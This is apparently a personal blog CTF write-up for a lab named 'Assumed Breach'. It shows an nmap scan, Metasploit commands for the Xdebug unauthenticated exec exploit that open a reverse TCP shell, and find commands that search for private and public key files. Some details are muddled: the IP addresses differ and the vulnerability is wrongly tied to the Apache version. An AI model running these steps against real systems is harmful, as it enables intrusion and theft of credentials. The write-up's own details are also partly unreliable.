---
layout: post
title:  "CTFLive - Assumed Breach"
postid: writeup
categories: CTFLive
---

<br />

# Hunting Artifacts
Kali IP: 192.117.250.2
Target IP: 192.117.250.3

Get 3 private and public keys

<br />

# Nmap Scan
nmap -sC -sV 192.141.136.3

80
* http-title: XODA
* Apache 2.4.7
* httponly flag not set

3306
* mysql protocol 10

OS: 5.5.47-0ubuntu04.04.1

<br />

# Vulnerability due to scan
Per Google Apache 2.4.7 has vulnerability in the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user. 

<https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec>

<br />

# Metasploit
```
> use exploit/unix/http/xdebug_unauth_exec
> show options
> set RHOST and LHOST for reversetcp
> exploit
```
```
> shell
$ cd .
$ find . -type f -name '*.pub'
$ find . -tyep f -name 'user_private'
```

Public Key
* ./opt/######.pub
* ./tmp/######.pub
* ./usr/local/bin/#####.pub

Private Key
* /usr/local/share/######
* /usr/bin/###########
* /var/######

**Flags were regarding names of files**